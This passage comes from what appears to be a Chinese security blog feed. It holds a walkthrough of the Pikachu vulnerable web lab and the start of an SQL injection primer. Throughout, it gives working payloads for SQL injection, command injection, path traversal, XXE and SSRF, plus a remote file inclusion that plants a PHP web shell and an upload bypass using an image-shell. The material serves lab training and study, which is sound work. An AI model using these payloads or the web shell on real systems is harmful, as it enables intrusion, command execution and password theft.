class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/6011/4_9.png" class></p><h2 id="4-4-xx型注入"><a href="#4-4-xx型注入" class="headerlink" title="4.4 xx型注入"></a>4.4 xx型注入</h2><p>也是一个输入框，也是可以采用报错注入，只需要将4.2的payload的’改成’)即可。</p><p>例如：</p><pre class="line-numbers language-bash"><code class="language-bash">payload：'<span class="token punctuation">)</span>or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="4-5-“insert-update”注入"><a href="#4-5-“insert-update”注入" class="headerlink" title="4.5 “insert/update”注入"></a>4.5 “insert/update”注入</h2><p>页面的两个输入框在多次尝试下无果，看了看标题，insert和update的注入，有个注册的信息，那就测试一下注册有没有注入吧。</p><h5 id="①发现注册的输入框都有sql注入："><a href="#①发现注册的输入框都有sql注入：" class="headerlink" title="①发现注册的输入框都有sql注入："></a>①发现注册的输入框都有sql注入：</h5><pre class="line-numbers language-bash"><code class="language-bash">payload：username<span class="token operator">=</span>11<span class="token string">'or updatexml(1,concat(0x7e,database(),0x7e),1) or '</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>   <img src="/posts/6011/4_10.png" class></p><h5 id="②注册一个用户，登录进去看看"><a href="#②注册一个用户，登录进去看看" class="headerlink" title="②注册一个用户，登录进去看看"></a>②注册一个用户，登录进去看看</h5><p>里面有个修改个人信息，用burp抓包测试一下：</p><p>发现每个注册框也存在 sql注入，但前提条件是每个空都先要随便填点东西，不然不满足条件。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：sex<span class="token operator">=</span>1'or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/6011/4_11.png" class></p><h2 id="4-6-“delete”注入"><a href="#4-6-“delete”注入" class="headerlink" title="4.6 “delete”注入"></a>4.6 “delete”注入</h2><p>页面有一个留言框，输入留言之后，会在下面显示输入的信息，有个delete可以删除留言，本关是delete注入，在点击delete的时候抓包，在id处发现注入。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/6011/4_12.png" class></p><h2 id="4-7-“http-header”注入"><a href="#4-7-“http-header”注入" class="headerlink" title="4.7 “http header”注入"></a>4.7 “http header”注入</h2><p>用admin/123456登录进去之后发现，记录了一些信息，用burp抓包，试试头部注入：</p><p>显示了ip，尝试将ip改成其他数字，发送，ip还是没变，可能不存在注入。</p><p>User-Agent和Accept显示了，改成其他的，变了。输入单引号，出现报错信息，这两处都存在注入。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：1<span class="token string">'or updatexml(1,concat(0x7e,database(),0x7e),1) or '</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/6011/4_13.png" class></p><h2 id="4-8-盲注-base-on-boolian"><a href="#4-8-盲注-base-on-boolian" class="headerlink" title="4.8 盲注(base on boolian)"></a>4.8 盲注(base on boolian)</h2><h3 id="采用基于布尔型的盲注："><a href="#采用基于布尔型的盲注：" class="headerlink" title="采用基于布尔型的盲注："></a>采用基于布尔型的盲注：</h3><p>当字母正确时，可以出现正确的信息，错误时出现错误信息。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：<span class="token string">'or substr(database(),1,1)='</span>p' limit 0,1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/6011/4_14.png" class></p><h2 id="4-9-盲注-base-on-time"><a href="#4-9-盲注-base-on-time" class="headerlink" title="4.9 盲注(base on time)"></a>4.9 盲注(base on time)</h2><h3 id="本关采用基于时间的盲注："><a href="#本关采用基于时间的盲注：" class="headerlink" title="本关采用基于时间的盲注："></a>本关采用基于时间的盲注：</h3><p>当字母正确时，会出现延时，不正确时会直接返回错误信息。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：<span class="token string">'or if(substr(database(),1,1)='</span>p',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span> limit 0,1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="4-10-宽字节注入"><a href="#4-10-宽字节注入" class="headerlink" title="4.10 宽字节注入"></a>4.10 宽字节注入</h2><p>这里是因为’会被转义成&#39;，即%5c%27，所以使用%df可以变成%df%5c%27，前面两个字节变被认为是一个，剩下后面单独的一个单引号。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：name<span class="token operator">=</span>%df' union <span class="token keyword">select</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span>,2<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意：这里是在burp里面实现的，直接在网页上输这个payload，%会被解析成%25，因此不能行。</p><p> <img src="/posts/6011/4_15.png" class></p><h1 id="5、RCE-远程命令-代码执行"><a href="#5、RCE-远程命令-代码执行" class="headerlink" title="5、RCE(远程命令/代码执行)"></a>5、RCE(远程命令/代码执行)</h1><p>这里就是存在命令执行，有几个管道符需要区分一下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">|</span>    直接执行后面的语句，不管前面真假<span class="token operator">&amp;</span>    两边语句都执行，不管前面真假<span class="token operator">||</span>   只有<span class="token operator">||</span>前面的语句为假时，才执行后面的语句<span class="token operator">&amp;&amp;</span>   只有<span class="token operator">&amp;&amp;</span>前面的语句为真时，才执行后面的语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-1-exec”ping”"><a href="#5-1-exec”ping”" class="headerlink" title="5.1 exec”ping”"></a>5.1 exec”ping”</h2><pre class="line-numbers language-bash"><code class="language-bash">输入：127.0.0.1 <span class="token operator">|</span> <span class="token function">whoami</span>（这里的whoami可以任意替换成其他命令）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>因此，可以得到系统的一些敏感信息：</p><p> <img src="/posts/6011/5.png" class></p><h2 id="5-2-exec”evel”"><a href="#5-2-exec”evel”" class="headerlink" title="5.2 exec”evel”"></a>5.2 exec”evel”</h2><pre class="line-numbers language-bash"><code class="language-bash">输入phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以得到信息：</p><p> <img src="/posts/6011/5_2.png" class></p><h1 id="6、Files-Inclusion-文件包含漏洞"><a href="#6、Files-Inclusion-文件包含漏洞" class="headerlink" title="6、Files Inclusion(文件包含漏洞)"></a>6、Files Inclusion(文件包含漏洞)</h1><h2 id="6-1-File-Inclusion-local"><a href="#6-1-File-Inclusion-local" class="headerlink" title="6.1 File Inclusion(local)"></a>6.1 File Inclusion(local)</h2><p>本地文件包含漏洞，可以查看一些系统的敏感信息。</p><p>在页面的下拉列表任意选择一个提交后，可以看到url中是显示了文件名称。</p><p>先将文件名称换成没有的编号，换成file6.php试试，耶？出现了一个隐藏文件耶。</p><p> <img src="/posts/6011/6.png" class></p><p>好了，还是继续试试file7.php，看到出现了报错：</p><p> <img src="/posts/6011/6_2.png" class></p><p>根据报错，可以看出include()函数包含的文件和fi_local.php在同一目录下，采用相对路径，使用尝试获取C:/windows/win.ini的敏感信息。</p><pre class="line-numbers language-bash"><code class="language-bash">算出要使用相对路径C:/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/windows/win.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/6011/6_3.png" class></p><p>可以查看同目录下的phpinfo.php文件。</p><p>D:\phpStudy\PHPTutorial\WWW\phpinfo.php</p><pre class="line-numbers language-bash"><code class="language-bash">根据报错信息，算出要使用相对路径<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/phpinfo.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/6011/6_4.png" class></p><h2 id="6-2-File-Inclusion-remote"><a href="#6-2-File-Inclusion-remote" class="headerlink" title="6.2 File Inclusion(remote)"></a>6.2 File Inclusion(remote)</h2><p>远程文件包含漏洞，攻击者可以传入任意代码。</p><p>6.1的本地包含的payload都适用于本关的远程文件包含。而且可以使用绝对路径。</p><p>可以上传远程文件：</p><p>现在自己的服务器上写好一个55.txt：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php fputs<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token string">'muma.php'</span>,<span class="token string">'w'</span><span class="token punctuation">)</span>,<span class="token string">'&lt;?php system(<span class="token variable">$_GET</span>["pass"]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问远程地址为：<a href="http://192.168.56.1:8099/55.txt">http://192.168.56.1:8099/55.txt</a></p><p>此时muma.php已经上传到后台服务器文件夹的同级目录下了：  </p><img src="/posts/6011/6_5.png" class><p>此时可以访问文件名和执行参数：</p><pre class="line-numbers language-bash"><code class="language-bash">http://192.168.56.1:8099/pikachu/vul/fileinclude/muma.php?pass<span class="token operator">=</span>ipconfig<span class="token operator">&amp;</span>submit<span class="token operator">=</span>%E6%8F%90%E4%BA%A4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/6011/6_6.png" class></p><h1 id="7、Unsafe-file-downloads-不安全的文件下载"><a href="#7、Unsafe-file-downloads-不安全的文件下载" class="headerlink" title="7、Unsafe file downloads(不安全的文件下载)"></a>7、Unsafe file downloads(不安全的文件下载)</h1><p>复制图片下载地址，修改文件路径，尝试获取敏感信息。</p><pre class="line-numbers language-bash"><code class="language-bash">filename<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/phpinfo.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/6011/7.png" class></p><h1 id="8、Unsafe-file-uploads-不安全的文件上传"><a href="#8、Unsafe-file-uploads-不安全的文件上传" class="headerlink" title="8、Unsafe file uploads(不安全的文件上传)"></a>8、Unsafe file uploads(不安全的文件上传)</h1><h2 id="8-1-client-check-客户端检查"><a href="#8-1-client-check-客户端检查" class="headerlink" title="8.1 client check(客户端检查)"></a>8.1 client check(客户端检查)</h2><p>先尝试上传php文件， 会发现客户端弹出了一个弹框，本关应该就是绕过前端js验证即可。</p><p>先上传一张正常的2.jpg图片，然后用burp抓包，将2.jpg修改成2.php，将内容修改为想要添加的php代码，看到已经成功上传：</p><p> <img src="/posts/6011/8.png" class></p><p>此时可以访问刚刚上传的php文件：</p><p> <img src="/posts/6011/8_2.png" class></p><h2 id="8-2-MIME-type-服务端检查"><a href="#8-2-MIME-type-服务端检查" class="headerlink" title="8.2 MIME type(服务端检查)"></a>8.2 MIME type(服务端检查)</h2><p>先上传一个2.php，然后用burp抓包，可以看到这里显示了content-type，那将它改成允许的，如image/jpg即可。</p><p> <img src="/posts/6011/8_3.png" class></p><p>可以看到此时，2.php已经成功上传：</p><p> <img src="/posts/6011/8_4.png" class></p><p>并且显示了文件的路径，此时可以访问文件：</p><p> <img src="/posts/6011/8_5.png" class></p><h2 id="8-3-getimagesize"><a href="#8-3-getimagesize" class="headerlink" title="8.3 getimagesize"></a>8.3 getimagesize</h2><p>本关记得把php.ini中的date.timezone打开：</p><p> <img src="/posts/6011/8_6.png" class></p><p>然后因为本关设置了白名单，所以采用图片马和文件包含漏洞。</p><pre class="line-numbers language-bash"><code class="language-bash">制作图片马：copy 2.jpg/b+2.php/a 3.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/6011/8_7.png" class></p><p>将包含恶意代码的3.jpg上传，上传成功且可以看到文件路径：</p><img src="/posts/6011/8_8.png" class><pre class="line-numbers language-bash"><code class="language-bash">http://192.168.56.1:8099/pikachu/vul/fileinclude/fi_local.php?filename<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/unsafeupload/uploads/2022/04/15/370534625966c9515b2413576391.jpg<span class="token operator">&amp;</span>submit<span class="token operator">=</span>%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功访问到刚刚上传的3.php：</p><p> <img src="/posts/6011/8_9.png" class></p><h1 id="9、Over-Permission-越权漏洞"><a href="#9、Over-Permission-越权漏洞" class="headerlink" title="9、Over Permission(越权漏洞)"></a>9、Over Permission(越权漏洞)</h1><h2 id="9-1-水平越权"><a href="#9-1-水平越权" class="headerlink" title="9.1 水平越权"></a>9.1 水平越权</h2><p>水平越权：指相同权限下不同的用户可以互相访问。</p><p>查看提示，这里有lucy,lili,kobe三个用户。</p><p>任意登录一个账号，查看个人信息：</p><p> <img src="/posts/6011/9.png" class></p><p>可以直接尝试改上面的username，来切换成其他用户。</p><p>如这里改成lili，则会直接出现lili的具体信息：</p><p> <img src="/posts/6011/9_2.png" class></p><h2 id="9-2-垂直越权"><a href="#9-2-垂直越权" class="headerlink" title="9.2 垂直越权"></a>9.2 垂直越权</h2><p>垂直越权：是不同级别之间或不同角色之间的越权，一般是低权限用户往高权限越权。</p><p>这里有两个用户，管理员：admin/123456，普通用户：pikuchu/000000</p><p>分别登录两个账号查看，发现admin有添加用户的的权限，而pikachu只有查看的权限。</p><p>接下来的越权就是用pikachu的账号来越权实现添加用户：</p><p>首先登录admin的账号，在创建账户页面，点击创建并用burp抓包。</p><p>  <img src="/posts/6011/9_3.png" class></p><p>将包发送到重发器，然后丢弃包，并且将admin退出登录。</p><p>此时登录普通用户pikachu，查看用户信息，刚刚的用户zzztt没有被添加。</p><p> <img src="/posts/6011/9_4.png" class></p><p>我们将pikachu页面的cookie复制，在重放器里将原来admin的cookie改成pikachu的，并点击发送页面：</p><p>  <img src="/posts/6011/9_5.png" class></p><p>此时，再次登录pikachu的账户，发现新账户zzztt添加成功：</p><p>  <img src="/posts/6011/9_6.png" class></p><h1 id="10、-目录遍历"><a href="#10、-目录遍历" class="headerlink" title="10、../../../(目录遍历)"></a>10、../../../(目录遍历)</h1><p>删掉url中的dir_list.php，可以看到整个目录，想访问哪个点进去就可以：</p><p>  <img src="/posts/6011/10.png" class></p><p>还可以通过../访问到相应目录：</p><p> <img src="/posts/6011/10_2.png" class></p><h1 id="11、I-can-see-your-ABC-敏感信息泄露"><a href="#11、I-can-see-your-ABC-敏感信息泄露" class="headerlink" title="11、I can see your ABC(敏感信息泄露)"></a>11、I can see your ABC(敏感信息泄露)</h1><p>在页面源码中直接泄露了测试账号：</p><p>  <img src="/posts/6011/11.png" class></p><p>利用lili/123456可以登录成功：</p><p>  <img src="/posts/6011/11_2.png" class></p><p>看到上面图片的目录，退出登录，在不登录的情况下，可以直接访问目录成功</p><pre class="line-numbers language-bash"><code class="language-bash">http://192.168.56.1:8099/pikachu/vul/infoleak/abc.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="12、PHP反序列化漏洞"><a href="#12、PHP反序列化漏洞" class="headerlink" title="12、PHP反序列化漏洞"></a>12、PHP反序列化漏洞</h1><p>浅浅地说一下，可以先看一下基本的序列化和反序列化的语法。</p><pre class="line-numbers language-bash"><code class="language-bash">payload：O:1:<span class="token string">"S"</span>:1:<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;s:4:"test";s:29:"&lt;script>alert('123')&lt;/script>";&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时会弹出弹窗：</p><p> <img src="/posts/6011/12.png" class></p><h1 id="13、XXE-XML-External-Entity-attack"><a href="#13、XXE-XML-External-Entity-attack" class="headerlink" title="13、XXE(XML External Entity attack)"></a>13、XXE(XML External Entity attack)</h1><p>xxe，即xml外部实体注入漏洞。</p><p>先提交一个正常的xml格式：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span> ?<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE note <span class="token punctuation">[</span>    <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY str <span class="token string">"hello world"</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>name<span class="token operator">></span><span class="token operator">&amp;</span>str<span class="token punctuation">;</span><span class="token operator">&lt;</span>/name<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>xml被解析了：</p><p> <img src="/posts/6011/13.png" class></p><p>利用外部实体，获取系统敏感信息：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span>?<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE a <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY b SYSTEM <span class="token string">"file:///C:/Windows/win.ini"</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>c<span class="token operator">></span><span class="token operator">&amp;</span>b<span class="token punctuation">;</span><span class="token operator">&lt;</span>/c<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/6011/13_2.png" class></p><h1 id="14、不安全的URL重定向"><a href="#14、不安全的URL重定向" class="headerlink" title="14、不安全的URL重定向"></a>14、不安全的URL重定向</h1><p>在页面中点击最后一句话时，可以看倒url中出现了url=i的参数，尝试将i改成其他的url，看能否实现跳转。</p><pre class="line-numbers language-bash"><code class="language-bash">例如：url<span class="token operator">=</span>https://www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就会跳转到百度的界面：</p><p> <img src="/posts/6011/14.png" class></p><h1 id="15、SSRF-Server-Side-Request-Forgery"><a href="#15、SSRF-Server-Side-Request-Forgery" class="headerlink" title="15、SSRF(Server-Side Request Forgery)"></a>15、SSRF(Server-Side Request Forgery)</h1><p>SSRF，即服务器端请求伪造。</p><h2 id="15-1-SSRF-curl"><a href="#15-1-SSRF-curl" class="headerlink" title="15.1 SSRF(curl)"></a>15.1 SSRF(curl)</h2><p>验证是否存在ssrf漏洞，利用dnslog平台：</p><pre class="line-numbers language-bash"><code class="language-bash">url<span class="token operator">=</span>https://5gl0rh.dnslog.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="/posts/6011/15_9.png" class></p><p>得到响应，即存在ssrf漏洞：</p><p> <img src="/posts/6011/15_10.png" class></p><p>发现是通过url请求资源，ssrf支持很多协议：</p><h3 id="①http"><a href="#①http" class="headerlink" title="①http://"></a>①http://</h3><pre class="line-numbers language-bash"><code class="language-bash">将地址跳转到百度：url<span class="token operator">=</span>http://www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/6011/15.png" class></p><pre class="line-numbers language-bash"><code class="language-bash">内网端口探测<span class="token punctuation">(</span>通过返回时间和长度判断端口的开放<span class="token punctuation">)</span>：url<span class="token operator">=</span>http://127.0.0.1:3306<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/6011/15_2.png" class></p><h3 id="②dict"><a href="#②dict" class="headerlink" title="②dict://"></a>②dict://</h3><pre class="line-numbers language-bash"><code class="language-bash">内网端口探测<span class="token punctuation">(</span>可探测到具体的版本号<span class="token punctuation">)</span>:url<span class="token operator">=</span>dict://127.0.0.1:3306<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/6011/15_3.png" class> </p><h3 id="③file"><a href="#③file" class="headerlink" title="③file://"></a>③file://</h3><pre class="line-numbers language-bash"><code class="language-bash">读取文件：url<span class="token operator">=</span>file://c:\windows\win.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/6011/15_4.png" class></p><h3 id="④gopher"><a href="#④gopher" class="headerlink" title="④gopher://"></a>④gopher://</h3><pre class="line-numbers language-bash"><code class="language-bash">内网端口探测：url<span class="token operator">=</span>gopher://127.0.0.1:3306<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/6011/15_5.png" class></p><h2 id="15-2-SSRF-file-get-content"><a href="#15-2-SSRF-file-get-content" class="headerlink" title="15.2 SSRF(file_get_content)"></a>15.2 SSRF(file_get_content)</h2><p>本关是采用file_get_contents函数进行文件的读取执行，file_get_contents可以对本地文件进行读取，也可以对远程文件进行读取。</p><p>利用dnslog平台验证是否存在ssrf漏洞：</p><pre class="line-numbers language-bash"><code class="language-bash">url<span class="token operator">=</span>http://6lyrgu.dnslog.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>存在回显，说明存在ssrf漏洞：</p><p> <img src="/posts/6011/15_11.png" class></p><h3 id="①http-1"><a href="#①http-1" class="headerlink" title="①http://"></a>①http://</h3><pre class="line-numbers language-bash"><code class="language-bash">将地址跳转到百度：url<span class="token operator">=</span>http://www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/6011/15_6.png" class></p><h3 id="②file"><a href="#②file" class="headerlink" title="②file://"></a>②file://</h3><pre class="line-numbers language-bash"><code class="language-bash">读取文件：url<span class="token operator">=</span>file://c:\windows\win.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="/posts/6011/15_7.png" class></p><h3 id="③php"><a href="#③php" class="headerlink" title="③php://"></a>③php://</h3><pre class="line-numbers language-bash"><code class="language-bash">读取后台的php源码：php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>ssrf.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <img src="/posts/6011/15_8.png" class></p>]]></content>
    
    
    <categories>
      
      <category>综合靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>Web漏洞</tag>
      
      <tag>pikachu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入知识点详解</title>
    <link href="/posts/b737.html"/>
    <url>/posts/b737.html</url>
    
    <content type="html"><![CDATA[<p>打完65关的sql靶场，浅浅地整理了一下关于sql注入的知识点。主要是mysql数据库的。</p><span id="more"></span><!--more--><h1 id="00x1-MySQL"><a href="#00x1-MySQL" class="headerlink" title="00x1 MySQL"></a>00x1 MySQL</h1><p>● 字段table_schema记录库名，table_name记录表名，column_name记录字段名</p><p>● 在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 infomation_schema 里面</p><p>● 这个库里面有很多表重点是这三个表 columns 、tables、schemata</p><pre class="line-numbers language-bash"><code class="language-bash">columns  存储该用户创建的所有数据库的库名、表名和字段名。tables   表字段table_schema 、table_name 分别记录着库名和表名schemata 表字段schema_name 记录着库的信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="00x2-常用函数："><a href="#00x2-常用函数：" class="headerlink" title="00x2 常用函数："></a>00x2 常用函数：</h1><ol><li><p>version()——MySQL 版本</p></li><li><p>user()——数据库用户名</p></li><li><p>database()——数据库名</p></li><li><p>@@datadir——数据库路径</p></li><li><p>@@version_compile_os——操作系统版本</p></li></ol><h1 id="00x3-sql注入"><a href="#00x3-sql注入" class="headerlink" title="00x3 sql注入"></a>00x3 sql注入</h1><h3 id="1、sql注入原理"><a href="#1、sql注入原理" class="headerlink" title="1、sql注入原理"></a>1、sql注入原理</h3><p>● 参数用户可控</p><p>● 参数带入数据库查询</p><h3 id="2、判断是否存在注入"><a href="#2、判断是否存在注入" class="headerlink" title="2、判断是否存在注入"></a>2、判断是否存在注入</h3><p>● 数字型注入：/1 和 /0回显不一样。或者传入id=1 and 1=1 和id=1 and 1=2回显不一样等等</p><p>● 字符型注入：’ 和 ‘’ 回显不一样，单数的和双数的单引号回显规不规律</p><h3 id="3、注释符"><a href="#3、注释符" class="headerlink" title="3、注释符"></a>3、注释符</h3><p>● 单行注释：减减加(–+)，减减空格(– )，#</p><p>● 多行注释：/<em>……</em>/</p><h1 id="00x4-sql注入分类"><a href="#00x4-sql注入分类" class="headerlink" title="00x4 sql注入分类"></a>00x4 sql注入分类</h1><h2 id="1、union联合注入"><a href="#1、union联合注入" class="headerlink" title="1、union联合注入"></a>1、union联合注入</h2><p>含义：联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进行联合查询。两个表的字段数要相同，不然会出现报错。</p><h4 id="●-Limit"><a href="#●-Limit" class="headerlink" title="● Limit"></a>● Limit</h4><p>Limit是指限定查询的条数。有三种方式：</p><h5 id="方式一：limit-参数1"><a href="#方式一：limit-参数1" class="headerlink" title="方式一：limit 参数1"></a>方式一：limit 参数1</h5><p>参数1可从1开始，往后递增，表示要查询几条数据。</p><p>例如，limit 1 表示限定查询一条语句。</p><h5 id="方式二：limit-参数1，参数2"><a href="#方式二：limit-参数1，参数2" class="headerlink" title="方式二：limit 参数1，参数2"></a>方式二：limit 参数1，参数2</h5><p>参数1从0开始，表示从第几行（按照索引0作第一行）开始查询，参数2表示要查询的条数。合在一起的意思就是，从参数1开始，查询参数2条语句。</p><p>例如，limit 0,1 表示查询第一条语句，和limit 1等意。</p><h5 id="方式三：limit-参数1-offset-参数2"><a href="#方式三：limit-参数1-offset-参数2" class="headerlink" title="方式三：limit 参数1 offset 参数2"></a>方式三：limit 参数1 offset 参数2</h5><p>参数1表示限定要查询几条，参数2表示从第几行（按照索引为0作第一行）开始查询。</p><p>例如：limit 1 offset 0 表示查询第一条参数。</p><h3 id="（1）判断"><a href="#（1）判断" class="headerlink" title="（1）判断"></a>（1）判断</h3><p>传入1正常，传入1’报错</p><p>传入1’ and ‘1’=’1 和传入 1’ and ‘1’=’2  页面回显不一样</p><h3 id="（2）判断字段数"><a href="#（2）判断字段数" class="headerlink" title="（2）判断字段数"></a>（2）判断字段数</h3><p>公式：order by n-1    到n出错时，则字段数为n-1</p><h3 id="（3）获取敏感信息"><a href="#（3）获取敏感信息" class="headerlink" title="（3）获取敏感信息"></a>（3）获取敏感信息</h3><p> -1 union select 1,2–+</p><p> (-1是让前面的表查询的内容不存在，将1或2可替换成version(),database(),user()等）</p><pre class="line-numbers language-bash"><code class="language-bash">例1：-1<span class="token string">' union select 1,user()例2：-1'</span> union <span class="token keyword">select</span> 1,group_concat<span class="token punctuation">(</span>user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x3a,database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="（4）获取表"><a href="#（4）获取表" class="headerlink" title="（4）获取表"></a>（4）获取表</h3><pre class="line-numbers language-bash"><code class="language-bash">-1' union <span class="token keyword">select</span> 1,<span class="token punctuation">(</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 0,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（5）获取字段"><a href="#（5）获取字段" class="headerlink" title="（5）获取字段"></a>（5）获取字段</h3><pre class="line-numbers language-bash"><code class="language-bash">-1’ union <span class="token keyword">select</span> 1,<span class="token punctuation">(</span>select column_name from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'users'</span> limit 0,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="（6）查询某个表的内容"><a href="#（6）查询某个表的内容" class="headerlink" title="（6）查询某个表的内容"></a>（6）查询某个表的内容</h3><h5 id="例如：获取users表的user和password"><a href="#例如：获取users表的user和password" class="headerlink" title="例如：获取users表的user和password"></a>例如：获取users表的user和password</h5><pre class="line-numbers language-bash"><code class="language-bash">-1' union <span class="token keyword">select</span> 1,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>user,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit 1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、Boolean布尔型盲注"><a 